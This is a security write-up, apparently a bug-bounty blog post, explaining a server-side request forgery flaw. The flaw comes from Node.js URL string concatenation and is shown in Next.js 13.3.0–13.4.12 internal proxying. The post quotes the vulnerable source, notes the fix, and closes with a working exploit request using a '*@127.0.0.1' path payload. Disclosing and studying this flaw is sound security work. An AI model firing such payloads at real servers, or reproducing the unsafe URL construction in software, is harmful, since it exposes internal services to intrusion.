+++
date = '2026-02-21T12:04:29+07:00'
draft = false
title = 'SSRF Pathname Confusion'
tags = ["ssrf", "bug bounty", "nodejs", "nextjs"]
+++

# SSRF via pathname confusion

## Affected pattern

Any Node.js application that constructs internal request URLs using naive string concatenation of the form: 
```js
const targetUrl = `http://${host}:${port}${userControlledPathname}`;
```

and then passes this URL to `http.request`, `http.get`, `axios`, `fetch`, `http-proxy`, or similar libraries without strict normalization and validation.

This PoC demonstrates a Server-Side Request Forgery (SSRF) vulnerability caused by differences in how Node.js parses URLs when the path contains special characters like `*@`.

## Root cause

HTTP/2.0 connection preface starts with a special pseudo-request to check if HTTP/2 is available to use:
```
PRI * HTTP/1.0

```

This `*` in the request line is treated specially by some parsers. When combined with the authority form `user@host:port`, Node.js http-parser can interpret malformed request lines in unexpected ways (and considers that request line **valid**).

So when pathname is attacker-controlled (via query parameter, route parameter, header, etc), specially crafted values like: `http://localhost:3000*@localhost:8000/admin` can trick parsers into interpreting the string as:

```
URL {
  href: 'http://localhost:3000*@localhost:8000/admin',
  origin: 'http://localhost:8000',
  protocol: 'http:',
  username: 'localhost',
  password: '3000*',
  host: 'localhost:8000',
  hostname: 'localhost',
  port: '8000',
  pathname: '/admin',
  search: '',
  searchParams: URLSearchParams {},
  hash: ''
}
```

This allows the application to send requests to arbitrary internal ports.

## Next.js SSRF

In Next.js versions `>= 13.3.0 | <= 13.4.12`, internal proxying used exactly this vulnerable construction

Source location `packages/next/src/server/lib/start-server.ts`:

```js
const getProxyServer = (pathname: string) => {
    const targetUrl = `http://${
        targetHost === 'localhost' ? '127.0.0.1' : targetHost
    }:${routerPort}${pathname}`
    const proxyServer = httpProxy.createProxy({
        target: targetUrl,
        changeOrigin: false,
        ignorePath: true,
        xfwd: true,
        ws: true,
        followRedirects: false,
    })

    proxyServer.on('error', (_err) => {
        // TODO?: enable verbose error logs with --debug flag?
    })
    return proxyServer
}
```

Since `pathname` is fully user-controlled, the `*@localhost:8000` payloads allowed full SSRF — including reading responses from internal services.

From 13.4.13 onward, internal requests switched to `fetch()` with proper URL normalization. `fetch` rejects malformed parts, blocking the attack.

This internal proxying feature can be enabled by default (in App Router apps) or by using this config:
```js
// next.config.js

experimental: {
  appDir: true,
}
```

### Exploitation

Request with payload:
```
GET *@127.0.0.1:3002 HTTP/1.1
Host: vulnerable.app
```
